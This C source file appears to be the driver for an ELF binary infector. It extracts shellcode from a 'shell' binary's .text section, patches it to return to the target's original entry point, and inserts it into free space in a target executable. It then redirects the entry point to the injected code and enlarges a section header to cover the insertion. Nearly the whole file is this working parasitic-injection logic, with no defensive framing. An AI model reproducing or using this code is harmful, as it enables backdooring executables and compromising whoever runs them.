#include "elffile.h"
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>

char *parse_args(int argc, char *argv[])
{
    for(int i = 0; i < argc; i++){
        if(strcmp(argv[i], "-f") == 0){
            return argv[i + 1];
        }
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    if(argc != 2){
        goto err;
    }

    Shellcode *s = ShellcodeConstructor("shell");
    if(s == NULL){
        puts("1");
        goto err;
    }

    int index = s->m_elf->FindSectionIndexByName(s->m_elf   \
            , ".text");
    if(index < 0){
        puts("2");
        goto err1;
    }

    s->ShellcodeExtractText(s, index);   

    Target *t = TargetConstructor(argv[1]);
    if(t == NULL){
        puts("4");
        goto err1;
    }

    s->ShellcodePatchRetAddress(s, t->m_elf->m_ehdr->e_entry);
    if(t->TargetFindFreeSpace(t, s->m_shellcode_size) <0){
        puts("5");
        goto err2;
    }

    //t->TargetAdjustSections(t, s->m_size);

    t->TargetInsertShellcode(t, s);
    t->m_elf->m_ehdr->e_entry = t->parasite_addr;
    for(int i = 0; i < t->m_elf->m_ehdr->e_shnum; i++){
        if(t->m_elf->m_shdr[i].sh_addr + t->m_elf->m_shdr[i].sh_size == t->parasite_addr){
            t->m_elf->m_shdr[i].sh_size += s->m_shellcode_size;
        }
    }

    t->TargetSaveFile(t);
err2:
    TargetDestructor(t);

err1:
    ShellcodeDestructor(s);

err:
    return 0;
}
